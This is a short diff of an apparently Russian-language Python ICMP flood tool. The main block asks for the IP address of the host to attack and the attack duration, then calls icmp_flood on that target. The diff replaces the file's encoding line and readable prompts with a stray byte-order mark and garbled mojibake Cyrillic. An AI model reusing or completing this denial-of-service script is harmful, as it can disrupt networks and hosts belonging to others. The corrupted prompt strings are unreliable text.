@@ -1,5 +1,4 @@
-# -*- coding: cp1251 -*-
-import socket
+п»їimport socket
 import random
 import struct
 import sys
@@ -42,6 +41,6 @@ def calculate_checksum(data):
     return checksum
 
 if __name__ == '__main__':
-    target_ip = str(input('IP-адрес атакуемого хоста: '))
-    duration = int(input('Продолжительность атаки (с): '))
+    target_ip = str(input('IP-Р°РґСЂРµСЃ Р°С‚Р°РєСѓРµРјРѕРіРѕ С…РѕСЃС‚Р°: '))
+    duration = int(input('РџСЂРѕРґРѕР»Р¶РёС‚РµР»СЊРЅРѕСЃС‚СЊ Р°С‚Р°РєРё (СЃ): '))
     icmp_flood(target_ip, duration)
